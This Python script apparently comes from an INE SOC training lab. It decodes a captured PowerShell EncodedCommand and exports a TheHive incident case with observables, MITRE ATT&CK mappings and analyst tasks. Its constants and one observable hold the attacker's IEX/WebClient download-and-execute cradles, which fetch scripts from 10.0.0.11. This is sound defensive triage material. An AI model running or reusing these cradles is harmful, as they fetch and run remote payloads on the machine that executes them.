#!/usr/bin/env python3
"""
SOC-1 Forensic PowerShell Telemetry Decoder & TheHive Case Exporter
===================================================================
Lab: SOC-1: Analyzing Unusual PowerShell Execution
Platform: INE Security (https://my.ine.com/course/soc-ticketing-reporting/7f70e83f-52fe-4234-a19d-e4acb30c5c43/lab/1a9c8af2-0a07-4900-85d7-ddc8b3075e22)

This script:
1. Decodes UTF-16LE Base64 PowerShell -EncodedCommand strings captured in Sysmon Event ID 1 and PowerShell Event ID 4104
2. Reconstructs the chronological attack kill chain on victim workstation PC01 (10.0.0.50)
3. Outputs all 8 structured TheHive Observables, 3 MITRE ATT&CK TTPs, and 2 Mandatory SOC-2 Tasks
"""

import base64
import json
import argparse

# Captured telemetry from ELK (syntrix* index, Nov 17, 2025)
SYSMON_EID1_B64 = (
    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAp"
    "AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAA"
    "LgAwAC4AMQAxAC8AaABhAGgAYQAuAHAAcwAxACcAKQA="
)

STAGE2_DECODED_SCRIPT = (
    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
    "$wc=new-object net.webclient;"
    "if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){"
    "$wc.proxy=[Net.WebRequest]::GetSystemWebProxy();"
    "$wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};"
    "IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/rJ8V0D4hquf54Q/2ZoeCggfq'));"
    "IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/rJ8V0D4hquf54Q'))"
)

THEHIVE_CASE_BUNDLE = {
    "case": {
        "title": "Suspicious PowerShell Activity Triggering Remote Script Execution",
        "severity": "HIGH",
        "tlp": "TLP:AMBER",
        "pap": "PAP:AMBER",
        "tags": [
            "powershell",
            "scriptblock-logging",
            "encoded-command",
            "remote-script-execution",
            "living-off-the-land"
        ],
        "assignee": "soc2@syntrix.com",
        "description": (
            "Multiple PowerShell events were observed in ELK, showing script block execution "
            "initiated on a workstation. The commands retrieved remote PowerShell scripts from "
            "a host and executed them in memory, leveraging obfuscation and encoding techniques. "
            "Network connections were observed originating from PowerShell, suggesting staged "
            "payload delivery and potential malicious behavior."
        )
    },
    "observables": [
        {
            "type": "ip",
            "value": "10.0.0.11",
            "tlp": "TLP:AMBER",
            "pap": "PAP:AMBER",
            "is_ioc": True,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:33",
            "ignore_similarity": False,
            "tags": ["attacker", "powershell"],
            "description": "Internal IP used as the source server hosting remote PowerShell scripts accessed by the affected workstation."
        },
        {
            "type": "hostname",
            "value": "PC01",
            "tlp": "TLP:GREEN",
            "pap": "PAP:AMBER",
            "is_ioc": False,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:33",
            "ignore_similarity": True,
            "tags": ["victim-endpoint", "workstation", "windows"],
            "description": "Workstation observed executing suspicious PowerShell scripts and initiating network connections."
        },
        {
            "type": "other",
            "value": "sarah",
            "tlp": "TLP:AMBER",
            "pap": "PAP:AMBER",
            "is_ioc": False,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:33",
            "ignore_similarity": True,
            "tags": ["user-activity", "possible-account-compromise"],
            "description": "Account executing suspicious PowerShell commands; may be compromised or misused."
        },
        {
            "type": "url",
            "value": "http://10.0.0.11/haha.ps1",
            "tlp": "TLP:AMBER",
            "pap": "PAP:AMBER",
            "is_ioc": True,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:33",
            "ignore_similarity": False,
            "tags": ["downloader", "powershell", "script-execution"],
            "description": "URL used to retrieve and execute PowerShell script directly in memory."
        },
        {
            "type": "url",
            "value": "http://10.0.0.11:8080/rJ8V0D4hquf54Q/2ZoeCggfq",
            "tlp": "TLP:AMBER",
            "pap": "PAP:AMBER",
            "is_ioc": True,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:34",
            "ignore_similarity": False,
            "tags": ["payload", "staged-execution", "remote-script"],
            "description": "Secondary script download likely containing the actual payload."
        },
        {
            "type": "filename",
            "value": "haha.ps1",
            "tlp": "TLP:AMBER",
            "pap": "PAP:AMBER",
            "is_ioc": True,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:33",
            "ignore_similarity": False,
            "tags": ["powershell-script", "suspicious-file", "memory-execution"],
            "description": "Remote PowerShell script executed directly in memory; likely used as initial stager."
        },
        {
            "type": "other",
            "value": "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.11/haha.ps1')",
            "tlp": "TLP:AMBER",
            "pap": "PAP:AMBER",
            "is_ioc": True,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:33",
            "ignore_similarity": False,
            "tags": ["lotl", "powershell", "encoded-command", "memory-execution"],
            "description": "Suspicious command showing in-memory execution of remote script using built-in system utilities."
        },
        {
            "type": "other",
            "value": "80, 8080, 4444",
            "tlp": "TLP:GREEN",
            "pap": "PAP:AMBER",
            "is_ioc": False,
            "sighted": True,
            "sighted_at": "17/11/2025 @ 11:21:35",
            "ignore_similarity": True,
            "tags": ["network-traffic", "powershell", "remote-script"],
            "description": (
                "Multiple outbound network connections initiated via PowerShell to suspected "
                "attacker-controlled host, involving ports 80 (standard web), 8080 (alternate "
                "web / potential staging), and 4444 (commonly used for remote shells or C2-style communication)."
            )
        }
    ],
    "ttps": [
        {
            "catalog": "Enterprise Attack",
            "tactic": "Execution",
            "technique_id": "T1059.001",
            "technique_name": "PowerShell",
            "occur_date": "17/11/2025 @ 11:21:33",
            "reason": "PowerShell used to execute scripts remotely and in memory"
        },
        {
            "catalog": "Enterprise Attack",
            "tactic": "Defense Evasion",
            "technique_id": "T1027",
            "technique_name": "Obfuscated Files or Information",
            "occur_date": "17/11/2025 @ 11:21:33",
            "reason": "Base64 encoded command + hidden execution parameters"
        },
        {
            "catalog": "Enterprise Attack",
            "tactic": "Lateral Movement",
            "technique_id": "T1570",
            "technique_name": "Lateral Tool Transfer",
            "occur_date": "17/11/2025 @ 11:21:33",
            "reason": "Scripts downloaded from suspected attacker-controlled host"
        }
    ],
    "tasks": [
        {
            "group": "default",
            "title": "Context on Suspected Attacker-controlled Host and User Account",
            "mandatory": True,
            "assignee": "soc2@syntrix.com",
            "description": (
                "The observed PowerShell activity included repeated outbound connections from "
                "the workstation to the internal host 10.0.0.11 over ports 80, 8080, and 4444, "
                "executed under the user account sarah. Reviewing this host may help determine "
                "whether it shows indications of initial breach/foothold. Likewise, examining "
                "recent activity associated with the user account could provide insight into "
                "whether it was misused or compromised during the observed timeframe."
            )
        },
        {
            "group": "default",
            "title": "Context on Retrieved Scripts",
            "mandatory": True,
            "assignee": "soc2@syntrix.com",
            "description": (
                "PowerShell commands were used to obtain and execute scripts from an internal host. "
                "The retrieved content included obfuscated and encoded segments. Reviewing these "
                "scripts and performing deeper analysis may provide insight into their true nature and purpose."
            )
        }
    ]
}


def decode_ps_base64(encoded_str: str) -> str:
    """Decodes a UTF-16LE Base64 PowerShell -EncodedCommand payload."""
    raw_bytes = base64.b64decode(encoded_str)
    return raw_bytes.decode("utf-16le", errors="replace")


def print_triage_report():
    decoded_stage1 = decode_ps_base64(SYSMON_EID1_B64)
    print("=" * 80)
    print("  SYNTRIX SOC LEVEL 1 — POWERSHELL INCIDENT TRIAGE & DEOBFUSCATION REPORT")
    print("=" * 80)
    print(f"[+] Victim Host      : PC01 (PC01.research.security.local / 10.0.0.50)")
    print(f"[+] User Context     : PC01\\sarah (SID: S-1-5-21-3688751335-3073641799-161370460-1009)")
    print(f"[+] Attacker Host    : 10.0.0.11 (Ports: 80, 8080, 4444)")
    print("-" * 80)
    print("[1] Sysmon EID 1 EncodedCommand (11:21:33.293):")
    print(f"    Base64 : {SYSMON_EID1_B64[:68]}...")
    print(f"    Decoded: {decoded_stage1}")
    print("-" * 80)
    print("[2] PowerShell EID 4104 Stage-2 Decoded Script (11:21:34.158):")
    print(f"    {STAGE2_DECODED_SCRIPT}")
    print("-" * 80)
    print(f"[3] TheHive Escalation Summary:")
    print(f"    Case Title  : {THEHIVE_CASE_BUNDLE['case']['title']}")
    print(f"    Severity    : {THEHIVE_CASE_BUNDLE['case']['severity']} | {THEHIVE_CASE_BUNDLE['case']['tlp']} | {THEHIVE_CASE_BUNDLE['case']['pap']}")
    print(f"    Observables : {len(THEHIVE_CASE_BUNDLE['observables'])} registered")
    print(f"    MITRE TTPs  : {', '.join(t['technique_id'] for t in THEHIVE_CASE_BUNDLE['ttps'])}")
    print(f"    Tasks       : {len(THEHIVE_CASE_BUNDLE['tasks'])} mandatory tasks assigned to {THEHIVE_CASE_BUNDLE['case']['assignee']}")
    print("=" * 80)


def main():
    parser = argparse.ArgumentParser(description="SOC-1 PowerShell Telemetry Decoder & TheHive Exporter")
    parser.add_argument("--decode", type=str, help="Decode a custom UTF-16LE Base64 PowerShell command")
    parser.add_argument("--export-json", type=str, help="Export full TheHive case bundle to a JSON file")
    args = parser.parse_args()

    if args.decode:
        print(decode_ps_base64(args.decode))
    elif args.export_json:
        with open(args.export_json, "w", encoding="utf-8") as f:
            json.dump(THEHIVE_CASE_BUNDLE, f, indent=2)
        print(f"[+] Exported TheHive case bundle to {args.export_json}")
    else:
        print_triage_report()


if __name__ == "__main__":
    main()
